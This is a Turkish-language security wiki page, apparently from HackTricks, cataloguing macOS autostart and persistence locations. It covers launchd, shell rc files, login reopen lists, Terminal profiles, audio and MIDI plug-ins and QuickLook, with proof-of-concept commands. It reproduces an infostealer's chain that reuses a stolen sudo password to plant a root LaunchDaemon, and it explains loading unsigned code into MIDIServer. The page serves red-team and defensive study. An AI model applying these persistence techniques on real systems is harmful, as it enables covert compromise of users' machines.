# macOS Otomatik Başlatma

{{#include ../banners/hacktricks-training.md}}

Bu bölüm büyük ölçüde [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) blog yazısı serisine dayanmaktadır. Amacı, bir dosyaya yazmanın daha sonra kod yürütülmesine yol açabileceği konumları, yürütmeyi tetikleyen olayı ve gereken izinleri belirlemektir. Bir konumun var olması, mekanizmanın etkin olduğunu kanıtlamaz. Aşağıda belirtilen yerel kontroller macOS 26.5.2'de (5 Ekim 2026) gerçekleştirilmiştir; her macOS sürümündeki davranışı doğrulamaz.

> [!NOTE]
> “Yazmayla tetiklenen” her zaman “yazdıktan hemen sonra çalışır” anlamına gelmez. Bazı konumlar yalnızca oturum açıldığında, belirli bir uygulama başlatıldığında veya kullanıcı bir işlem gerçekleştirdiğinde okunur. Önceden yapılandırılmış bir iş içindeki yazılabilir bir payload, yeni bir iş kaydetme izninden de farklıdır. Bir tekniğe güvenmeden önce geçici bir hesapta veya VM'de test edin.

## Sandbox Bypass

> [!TIP]
> Burada, yalnızca **bir şeyi bir dosyaya yazarak** ve çok **yaygın** bir **eylemi**, belirli bir **süreyi** veya genellikle root izni gerektirmeden sandbox içinden gerçekleştirebileceğiniz bir **eylemi** bekleyerek çalıştırmanızı sağlayan **sandbox bypass** için kullanışlı başlangıç konumlarını bulabilirsiniz.

### Launchd

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konumlar

- **`/Library/LaunchAgents`**
  - **Tetikleyici**: Kullanıcı oturumu açıldığında (veya açıkça kaydedildiğinde)
  - Root izni gerekir
- **`/Library/LaunchDaemons`**
  - **Tetikleyici**: Sistem açılışında (veya açıkça kaydedildiğinde)
  - Root izni gerekir
- **`/System/Library/LaunchAgents`**
  - **Tetikleyici**: Kullanıcı oturumu açıldığında; korumalı Apple sistem konumu
- **`/System/Library/LaunchDaemons`**
  - **Tetikleyici**: Sistem açılışında; korumalı Apple sistem konumu
- **`~/Library/LaunchAgents`**
  - **Tetikleyici**: Oturum yeniden açıldığında

`launchd` tarafından taranan bir `~/Library/LaunchDaemons` konumu yoktur. Kullanıcı başına işler `~/Library/LaunchAgents` içinde yer alır; sistem daemon dizini ise `/Library/LaunchDaemons` konumudur. [Apple'ın launchd başlangıç kılavuzu](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) taranan konumları belgelendirir.

> [!TIP]
> İlginç bir bilgi olarak, **`launchd`** Mach-o bölümündeki `__Text.__config` içinde gömülü bir property list'e sahiptir; bu liste, launchd'nin başlatması gereken diğer bilinen hizmetleri içerir. Ayrıca bu hizmetlerde, çalıştırılmaları ve başarıyla tamamlanmaları gerektiği anlamına gelen `RequireSuccess`, `RequireRun` ve `RebootOnSuccess` anahtarları bulunabilir.
>
> Elbette, code signing nedeniyle bu değiştirilemez.

#### Açıklama ve Exploitation

**`launchd`**, OX S kernel'in başlangıçta yürüttüğü **ilk** **process** ve kapatılma sırasında sonlanan son process'tir. Her zaman **PID 1** olmalıdır. Bu process, aşağıdaki konumlarda bulunan **ASEP** **plist** dosyalarında belirtilen yapılandırmaları **okur ve yürütür**:

- `/Library/LaunchAgents`: Yönetici tarafından yüklenen, kullanıcı başına agent'lar
- `/Library/LaunchDaemons`: Yönetici tarafından yüklenen, sistem genelindeki daemon'lar
- `/System/Library/LaunchAgents`: Apple tarafından sağlanan, kullanıcı başına agent'lar.
- `/System/Library/LaunchDaemons`: Apple tarafından sağlanan, sistem genelindeki daemon'lar.

Bir kullanıcı oturum açtığında `launchd`, o kullanıcının `~/Library/LaunchAgents` dizinindeki plist'leri kullanıcının izinleriyle yükler. İşler kendi anahtarlarına göre başlatılır; bir plist'i yüklemek, process'in hemen çalıştırılacağı anlamına gelmez.

**Agent'lar ile daemon'lar arasındaki temel fark, agent'ların kullanıcı oturumu açıldığında, daemon'ların ise sistem açılışında yüklenmesidir** (çünkü ssh gibi bazı hizmetlerin herhangi bir kullanıcı sisteme erişmeden önce çalıştırılması gerekir). Ayrıca agent'lar GUI kullanabilirken daemon'ların arka planda çalışması gerekir.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

Her `ProgramArguments` öğesi ayrı bir argümandır; `launchd`, tek bir dizeyi shell komutu olarak ayrıştırmaz. Yukarıdaki düzeltilmiş örneğin sözdizimini yüklemeden `plutil -lint /path/to/example.plist` ile denetleyebilirsiniz. `ProgramArguments`, `RunAtLoad` ve `KeepAlive` için yerel `man launchd.plist` girdisine bakın.

#### Mevcut işlerde dosya olayı tetikleyicileri

**Önceden yüklenmiş** bir agent veya daemon, adlandırılmış bir yol değiştiğinde başlatılmak için `WatchPaths` kullanabilir. `QueueDirectories`, bir dizin boş değilken işi başlatır; `StartOnMount` ise bir volume bağlandığında başlatır. [Apple'ın launchd kılavuzunda](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) `WatchPaths` ve `QueueDirectories` örnekleri yer alır. İzlenen bir dosyaya yazılması **önceden yapılandırılmış işi** tetikler; bu, yalnızca yazan taraf işin yürütülebilir dosyasını, script'ini veya işin yorumladığı verileri de kontrol edebiliyorsa rastgele kod yürütme olanağı sağlar. Taranan veya kaydedilmiş bir konumun dışına yeni bir plist yazmak tek başına onu yüklemez.

Bu kendi kendini temizleyen PoC, benzersiz adlandırılmış **geçici bir kullanıcı agent'ı** kaydeder, yalnızca kendi izlenen dosyasını değiştirir ve agent'ı kaldırır. macOS 26.5.2'de oturum kapatmadan veya yeniden başlatmadan başarıyla çalıştırıldı:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

Yerel çalıştırmada `watch fired: True` yazdırıldı ve `bootout` başarılı oldu. `launchctl bootstrap` burada yalnızca izole PoC içinde kullanılır; zaten yüklenmiş bir job için gerekli **değildir**. Mevcut bir job'ı güvenli şekilde değerlendirmek için plist dosyasını ve çözümlenmiş `ProgramArguments` yolunu okuyun, ardından ilgili executable veya yorumlanan dosyanın herhangi bir değişiklik yapmadan yazılabilir olup olmadığını kontrol edin.

Bir **agent'ın kullanıcı giriş yapmadan önce çalıştırılması gereken** durumlar vardır; bunlara **PreLoginAgents** denir. Örneğin bu, giriş sırasında yardımcı teknoloji sağlamak için kullanışlıdır. Bunlar `/Library/LaunchAgents` içinde de bulunabilir ([**burada**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) bir örnek görebilirsiniz).

> [!TIP]
> Yeni Daemons veya Agents yapılandırma dosyaları **bir sonraki yeniden başlatmadan sonra veya** `launchctl load <target.plist>` **kullanılarak yüklenir**. `.plist` uzantısı olmayan dosyaları da `launchctl -F <file>` ile yüklemek **mümkündür** (ancak bu plist dosyaları yeniden başlatma sonrasında otomatik olarak yüklenmez).\
> `launchctl unload <target.plist>` ile **kaldırmak** da **mümkündür** (bu dosyanın işaret ettiği process sonlandırılır),
>
> Bir **Agent** veya **Daemon'ın çalışmasını engelleyen** herhangi bir şey (örneğin bir override) **olmadığından emin olmak için** şunu çalıştırın: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Mevcut kullanıcı tarafından yüklenen tüm agents ve daemons'ları listeleyin:

```bash
launchctl list
```

#### Örnek kötü amaçlı LaunchDaemon zinciri (parola yeniden kullanımı)

Yakın zamanda görülen bir macOS infostealer, bir user agent ve root LaunchDaemon bırakmak için **ele geçirilmiş sudo parolasını** yeniden kullandı:<sup>[[1]](#references)</sup>

- Agent döngüsünü `~/.agent` konumuna yazın ve çalıştırılabilir hâle getirin.
- Bu agent'ı işaret eden bir plist'i `/tmp/starter` konumunda oluşturun.
- Çalınan parolayı `sudo -S` ile yeniden kullanarak plist'i `/Library/LaunchDaemons/com.finder.helper.plist` konumuna kopyalayın, sahibi ve grubu `root:wheel` olarak ayarlayın ve `launchctl load` ile yükleyin.
- Çıktıyı ayırmak için agent'ı `nohup ~/.agent >/dev/null 2>&1 &` ile sessizce başlatın.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> `/Library/LaunchDaemons` içine yerleştirilen bir daemon plist dosyası, sahipliği kullanıcıya verilerek güvenli hâle gelmez. `launchd`, sistem işleri için uygun sahiplik ve izinler gerektirir ve güvenli olmayan bir plist dosyasını reddedebilir. Root sahipliğindeki bir daemon, yapılandırmasında başka bir hesap seçilmediği sürece genellikle root olarak çalışır. İşin `UserName` ve `GroupName` değerlerini, sahipliğini ve `launchctl` tanılamalarını kontrol edin; yalnızca plist sahibinin adına bakarak çalıştırma kimliğini çıkarsamayın.

#### launchd hakkında daha fazla bilgi

**`launchd`**, **kernel** tarafından başlatılan **ilk** kullanıcı modu işlemidir. İşlem başarıyla başlamalıdır ve **sonlanamaz veya çökemez**. Hatta bazı **sonlandırma sinyallerine** karşı **korunur**.

`launchd`'nin yapacağı ilk işlerden biri aşağıdaki gibi tüm **daemon**'ları **başlatmaktır**:

- Çalıştırılma zamanına göre çalışan **Zamanlayıcı daemon'ları**:
  - `com.apple.atrun.plist`, macOS 26.5.2'de `StartInterval = 30` saniye olacak şekilde `/usr/libexec/atrun`'ı çağırır; etkin durumu, launchd geçersiz kılmaları ayrı tuttuğundan plist'in `Disabled` anahtarından farklı olabilir.
  - `/usr/lib/cron/tabs` iş içerdiğinde `com.vix.cron.plist`, `/usr/sbin/cron`'u çağırır. `com.apple.systemstats.daily`, cron daemon'ından farklı, zamanlanmış başka bir hizmettir.
- Aşağıdakiler gibi **Ağ daemon'ları**:
  - `org.cups.cups-lpd`: TCP üzerinden dinler (`SockType: stream`), `SockServiceName: printer`
    - SockServiceName bir port ya da `/etc/services` içindeki bir hizmet olmalıdır
  - `com.apple.xscertd.plist`: TCP 1640 portunda dinler
- Belirtilen bir yol değiştiğinde çalıştırılan **Yol daemon'ları**:
  - `com.apple.postfix.master`: `/etc/postfix/aliases` yolunu denetler
- **IOKit bildirim daemon'ları**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
  - `com.apple.xscertd-helper.plist`: `MachServices` girdisinde `com.apple.xscertd.helper` adını belirtir
- **UserEventAgent:**
  - Bu, önceki örnekten farklıdır. Belirli bir olaya yanıt olarak launchd'nin uygulamaları başlatmasını sağlar. Ancak bu durumda ilgili ana ikili dosya `launchd` değil, `/usr/libexec/UserEventAgent`'tır. SIP tarafından kısıtlanan `/System/Library/UserEventPlugins/` klasöründen eklentiler yükler; her eklenti başlatıcısını `XPCEventModuleInitializer` anahtarında veya eski eklentilerde `Info.plist` dosyasının `CFPluginFactories` sözlüğündeki `FB86416D-6164-2070-726F-70735C216EC0` anahtarı altında belirtir.

### shell başlangıç dosyaları

Yazı: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Yazı (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- sandbox'ı atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
  - Ancak bu dosyaları yükleyen bir shell çalıştıran TCC bypass'a sahip bir uygulama bulmanız gerekir

#### Konumlar

- **`~/.zshenv`** (veya daha yeni derlenmiş **`~/.zshenv.zwc`**)
  - **Tetikleyici**: Etkileşimsiz `zsh -c` dâhil, her olağan zsh çağrısı; `zsh -f` kullanıcı başlangıç dosyalarını atlar.
- **`~/.zshrc`**
  - **Tetikleyici**: Etkileşimli zsh başlatılır.
- **`~/.zprofile`, `~/.zlogin`**
  - **Tetikleyici**: Login zsh başlatılır; bunlar sırasıyla `.zshrc` dosyasından önce ve sonra okunur.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Tetikleyici**: zsh ile bir terminal açın
  - Root gerekir
- **`~/.zlogout`**
  - **Tetikleyici**: Login zsh normal şekilde sonlanır; her terminal veya shell çıkışında çalışmaz.
- **`/etc/zlogout`**
  - **Tetikleyici**: zsh ile bir terminalden çıkın
  - Root gerekir
- Potansiyel olarak daha fazlası: **`man zsh`**
- **`~/.bashrc`**
  - **Tetikleyici**: Etkileşimli **login olmayan** Bash başlatılır. Etkileşimli login Bash bu dosyayı yalnızca bir login dosyası açıkça kaynak olarak alırsa okur.
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Tetikleyici**: Login Bash başlatılır; bu sıradaki okunabilir ilk dosya çalıştırılır. Önceki dosyalardan biri varsa `~/.profile` atlanır.
- **`/etc/profile`**
  - **Tetikleyici**: Login Bash başlatılır; bunu değiştirmek için root gerekir.
- **`~/.tcshrc`** veya bu yoksa **`~/.cshrc`**
  - **Tetikleyici**: Bu Mac'te etkileşimsiz `tcsh -c` dâhil, `tcsh` başlatılır. Kullanıcının gerçekten `tcsh` çağırması gerekir; macOS'un varsayılan shell'i değildir.
- **`~/.login`**
  - **Tetikleyici**: Login `tcsh`, rc dosyasından sonra başlatılır.
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Tetikleyici**: xterm ile tetiklenmeleri beklenir, ancak **yüklü değildir**; yüklendikten sonra bile şu hata oluşur: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Açıklama ve Exploitation

`zsh` veya `bash` gibi bir shell ortamı başlatılırken **belirli başlangıç dosyaları çalıştırılır**. macOS şu anda varsayılan shell olarak `/bin/zsh` kullanır. Terminal veya SSH'nin login ya da etkileşimli bir shell başlatıp başlatmayacağı yapılandırmalarına bağlıdır; yukarıdaki her dosyanın her oturumda çalıştığını varsaymayın. macOS'ta `bash` ve `sh` de bulunur, ancak kullanılmaları için açıkça çağrılmaları gerekir.<sup>[[2]](#references)</sup> [zsh başlangıç dosyası başvurusu](https://zsh.sourceforge.io/Doc/Release/Files.html) sıralamayı, `ZDOTDIR` geçersiz kılmasını ve `.zwc` kuralını açıklar.

Aşağıdaki salt okunur deneyde macOS 26.5.2'de geçici bir `ZDOTDIR` kullanıldı. Gerçek shell başlangıç dosyalarının hiçbiri değiştirilmeden hangi kullanıcı dosyalarının okunduğunu gösterir:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

Gözlemlenen sıra `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout` şeklindeydi. `ZDOTDIR` zaten alternatif dizini göstermelidir; rastgele bir dizine dosya yazmak yeterli değildir.

[Bash'in başlangıç başvurusu](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html), login ve interactive shell'leri birbirinden ayırır. macOS 26.5.2 test makinesinde, dört kullanıcı başlangıç dosyasının tümünü içeren yalıtılmış bir `HOME` şu sonuçları verdi: `bash -c` → hiçbiri, `bash -ic` → `.bashrc`, `bash -lc` ve `bash -lic` → yalnızca `.bash_profile`. `.bash_profile` kaldırıldığında, login Bash önce `.bash_login` dosyasını, o da kaldırıldığında `.profile` dosyasını okudu. `BASH_ENV`, interactive olmayan Bash'in bir dosyaya yönlendirilmesini sağlayabilir; ancak bu ortam değişkeninin çağıran süreçte önceden ayarlanmış olması gerekir. Login Bash'ten açıkça `exit` komutu verilmesi, `~/.bash_logout` dosyasının da yüklenmesini sağlayabilir.

Yerel `tcsh(1)` kılavuzu, ayrı başlangıç sırasını belgeler. Geçici bir `HOME` ile `/bin/tcsh -c :`, `.tcshrc` dosyasını; `.tcshrc` yoksa `.cshrc` dosyasını okudu. Geçici bir login `tcsh`, `.tcshrc` ve `.login` dosyalarını okudu. Bu kontrollerde yalnızca geçici dosyalar oluşturulup silindi.

### Yeniden Açılan Uygulamalar

> [!CAUTION]
> Belirtilen exploitation ayarlandıktan ve oturum kapatılıp yeniden açıldıktan, hatta yeniden başlatıldıktan sonra bile testlerde uygulama çalıştırılmadı. Bu işlemler yapılırken uygulamanın çalışıyor olması gerekebilir.

**Yazı**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Tetikleyici**: Yeniden başlatma sırasında uygulamaların yeniden açılması

#### Açıklama ve Exploitation

Yeniden açılacak tüm uygulamalar `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` plist dosyasındadır<sup>[[4]](#references)</sup>

Bu nedenle, yeniden açılan uygulamaların kendi uygulamanızı başlatmasını sağlamak için **uygulamanızı listeye eklemeniz** yeterlidir.

UUID, bu dizin listelenerek veya `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` komutuyla bulunabilir.

Yeniden açılacak uygulamaları kontrol etmek için şunu çalıştırabilirsiniz:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

**Bu listeye bir uygulama eklemek için şunu kullanabilirsiniz:**

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Terminal Tercihleri

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Sandbox'u atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal, onu kullanan kullanıcının FDA izinlerine sahip olabiliyor

#### Konum

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Tetikleyici**: Başlangıç komutunu içeren Shell ayarlarına sahip profili kullanarak yeni bir Terminal penceresi veya sekmesi açmak

#### Açıklama ve Exploitation

**`~/Library/Preferences`** içinde, kullanıcının Applications uygulamalarına ait tercihler saklanır. Bu tercihlerden bazıları, **başka uygulamaları/script'leri çalıştırmak** için bir yapılandırma içerebilir.<sup>[[5]](#references)</sup>

Örneğin, Terminal başlangıçta bir komut çalıştırabilir:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Bu yapılandırma, **`~/Library/Preferences/com.apple.Terminal.plist`** dosyasına şu şekilde yansır:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

İlgili profilde bir başlangıç komutu varsa ve Terminal bu tercihi okursa, bu profili kullanan yeni bir oturum komutu çalıştırabilir. [Apple'ın güncel Terminal kılavuzunda](https://support.apple.com/guide/terminal/trmlshll/mac) profile özel **Shell → Startup** komutu açıklanıyor. Bu profili kullanan yeni bir oturum açmadan yalnızca Terminal'i açmak yeterli değildir. Aşağıdaki tercih düzenlemeleri araştırma Mac'inde **uygulanmadı**.

Bunu CLI üzerinden ekleyebilirsiniz:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Terminal Scripts / Diğer dosya uzantıları

- Sandbox'ı bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Kullanıcının FDA izinlerine sahip olması için Terminal'ı kullanın

#### Konum

- **Herhangi bir yer**
  - **Tetikleyici**: İlgili `.terminal`, `.command` veya `.tool` dosyasını açın

#### Açıklama ve Exploitation

Bir kullanıcı **`.terminal`** ayar dosyasını açarsa Terminal, profilinden bir oturum oluşturabilir; çalıştırılabilir **`.command`** ve **`.tool`** dosyaları da Terminal'da açılabilir. Bu, Terminal'ı yalnızca açmaktan kaynaklanan bir çalıştırma değil, dosyanın açıkça açılmasıyla tetiklenir. Devralınan TCC erişimi, Terminal'ın gerçekte sahip olduğu izinlere ve denenen işleme bağlıdır. Aşağıdaki tarihî örnek araştırma Mac'inde çalıştırılmadı.

Şunu deneyin:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

Ayrıca normal shell script içeriğine sahip **`.command`** ve **`.tool`** uzantılarını da kullanabilirsiniz; bunlar da Terminal ile açılır.

> [!CAUTION]
> Terminal'de **Full Disk Access** varsa bu işlemi tamamlayabilir (yürütülen komutun bir Terminal penceresinde görüneceğini unutmayın).

### Ses Eklentileri

İnceleme: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
İnceleme: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Sandbox bypass için yararlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Ek TCC erişimi elde edebilirsiniz

#### Konum

- **`/Library/Audio/Plug-Ins/HAL`**
  - Root gerekir
  - **Tetikleyici**: Core Audio sunucusu uyumlu bir HAL aygıt eklentisi yükler; sunucunun yeniden başlatılması aygıtın yeniden keşfedilmesine neden olabilir
- **`/Library/Audio/Plug-ins/Components`**
  - Root gerekir
  - **Tetikleyici**: Bir ses ana bilgisayarı kurulu Audio Unit'i keşfedip örneklendirir
- **`~/Library/Audio/Plug-ins/Components`**
  - **Tetikleyici**: Bir ses ana bilgisayarı kurulu Audio Unit'i keşfedip örneklendirir
- **`/System/Library/Components`**
  - Apple tarafından sağlanan, sistem korumalı konum
  - **Tetikleyici**: Bir ses ana bilgisayarı eşleşen bir sistem bileşenini örneklendirir

#### Açıklama

Önceki incelemelere göre bazı ses eklentilerini **derleyip** yüklenmelerini sağlamak mümkündür.<sup>[[6]](#references)[[7]](#references)</sup>

HAL aygıt eklentileri ve Audio Unit'ler farklı yükleme yollarına sahiptir. [Apple'ın Audio Unit barındırma kılavuzu](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html), bir ana bilgisayarın bileşeni bulup örneklendirmesi gerektiğini belirtir; bileşeni bir tarama dizinine kopyalamak veya `coreaudiod`'u yeniden başlatmak tek başına kodun yürütüldüğünü kanıtlamaz. AUv2 eklentileri ana bilgisayar sürecinde çalışırken, [Apple'ın güncel Audio Unit kılavuzu](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) AUv3'ün macOS'te varsayılan olarak ayrı bir süreçte çalıştığını belirtir. İmza, sandbox ve kitaplık doğrulama kontrolleri ana bilgisayara bağlıdır. Araştırma Mac'ine hiçbir ses eklentisi yüklenmedi veya burada yürütülmedi.

### CoreMIDI Sürücüleri (MIDIServer)

İnceleme: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Sandbox bypass için yararlı: [✅](https://emojipedia.org/check-mark-button)
  - Kodunuz uygulamanızın sandbox'ında değil, `MIDIServer` sürecinde çalışır
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` kendi `seatbelt` sandbox profilinde çalışır

#### Konum

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Root gerekmez (kullanıcı tarafından yazılabilir)
  - **Tetikleyici**: `MIDIServer` başlar veya yeniden başlar. İlk kez herhangi bir süreç CoreMIDI kullandığında isteğe bağlı olarak başlatılır (`Audio MIDI Setup`, GarageBand, bir DAW veya WebMIDI kullanan bir sayfa açıldığında)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Root gerekir
  - **Tetikleyici**: Yukarıdakiyle aynı

#### Açıklama ve Exploitation

Apple'ın `MIDIServer`'ı (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`), `Audio/MIDI Drivers` dizinlerinden MIDI **driver** bundle'larını yükler. İkili dosya Apple tarafından imzalanmıştır, ancak `com.apple.security.cs.disable-library-validation` entitlement'ı ile birlikte gelir; bu nedenle **imzasız veya farklı bir ekip tarafından ad-hoc imzalanmış** bir bundle'ı yükleyerek **root olmadan**, Apple'a ait ayrı bir süreç içinde kod yürütülmesini sağlar.<sup>[[53]](#references)</sup>

macOS 26'da doğrulandı (salt okunur):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

Bir driver, `MIDIDriverInterface` factory’sini dışa aktaran standart bir bundle’dır; payload’ı factory/constructor içine yerleştirmek, `MIDIServer` driver’ları numaralandırır numaralandırmaz çalışmasını sağlar. Derleyin, `~/Library/Audio/MIDI Drivers/Evil.plugin` olarak bırakın ve oturumu kapatmadan ya da yeniden başlatmadan yüklenmesini tetikleyin:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### QuickLook Eklentileri

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- sandbox'ı atlatmak için faydalı: [✅](https://emojipedia.org/check-mark-button)
- TCC atlatma: [🟠](https://emojipedia.org/large-orange-circle)
  - Ek TCC erişimi elde edebilirsiniz

#### Konum

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Açıklama ve Exploitation

